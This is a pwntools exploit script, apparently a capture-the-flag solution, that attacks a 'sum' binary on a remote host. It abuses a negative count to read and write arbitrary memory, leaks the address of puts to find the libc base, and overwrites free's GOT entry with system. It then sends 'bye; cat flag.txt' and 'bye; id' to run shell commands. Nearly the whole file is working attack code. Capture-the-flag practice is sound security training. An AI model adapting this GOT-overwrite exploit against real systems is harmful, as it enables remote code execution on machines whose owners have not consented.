from pwn import *
import argparse
import os
import string

#context.log_level = "debug"
LOCAL_PATH = "./sum"

def get_process(is_remote = False):
    if is_remote:
        return remote("35.207.132.47", 22226)
    else:
        return process(LOCAL_PATH)

def get_libc_path(is_remote = False):
    if is_remote:
        return "./libc-2.27.so"
    else:
        return "/lib/x86_64-linux-gnu/libc.so.6"

def read_menu(proc):
    proc.recvuntil("\n> ")

def set_addr(proc, addr, value):
    log.info("Setting address {} to value {}".format(hex(addr), hex(value)))
    assert(addr % 8 == 0)
    set_cmd(proc, addr / 8, value)

def get_addr(proc, addr):
    log.info("Getting value of address {}".format(hex(addr)))
    assert(addr % 8 == 0)
    return int(get_cmd(proc, addr / 8))

def set_cmd(proc, index, value):
    log.info("Setting index {} to value {}".format(index, value))
    read_menu(proc)
    proc.sendline("set {} {}".format(index, value))

def get_cmd(proc, index):
    read_menu(proc)
    proc.sendline("get {}".format(index))
    out = proc.readline(keepends = False)
    log.info("Index {} has value {} ({})".format(index, out, hex(int(out))))
    return out

def bye_cmd(proc):
    read_menu(proc)
    proc.sendline("bye")

parser = argparse.ArgumentParser()
parser.add_argument("-r", "--remote", help="Execute on remote server", action="store_true")
args = parser.parse_args()

e = ELF(LOCAL_PATH)
libc = ELF(get_libc_path(args.remote))
context.binary = e.path

p = get_process(args.remote)

p.sendlineafter("How many values to you want to sum up?\n> ", "-1")
log.info("puts() - GOT: {}, PLT: {}".format(hex(e.got["puts"]), hex(e.plt["puts"])))
puts_addr = get_addr(p, e.got["puts"])
log.info("Runtime address of puts(): {}".format(hex(puts_addr)))
libc_base = puts_addr - libc.symbols['puts']
log.info("LibC Base: {}".format(hex(libc_base)))

libc.address = libc_base

log.info("free() GOT: {}".format(hex(e.got["free"])))
log.info("system() runtime address: {}".format(hex(libc.symbols["system"])))
set_addr(p, e.got["free"], libc.symbols["system"])
read_menu(p)
payload = "bye; cat flag.txt"
payload = "bye; id"
log.info("Sending payload: {}".format(payload))
p.sendline(payload)
print p.recvall()

